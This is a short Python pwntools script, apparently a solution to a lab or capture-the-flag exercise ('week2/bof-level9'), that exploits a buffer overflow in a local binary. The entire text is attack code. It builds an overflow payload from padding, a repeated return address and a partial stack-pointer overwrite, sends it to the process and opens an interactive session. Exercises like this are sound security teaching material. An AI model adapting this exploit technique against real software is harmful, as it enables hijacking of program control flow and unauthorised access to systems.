#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level9/bof-level9')

buffer = "A" + p32(0x0804852b)*(120/4) + "AAA"  + "\x01\xc5\xff\xff" + "C"*58


p.sendline(buffer)
p.interactive()
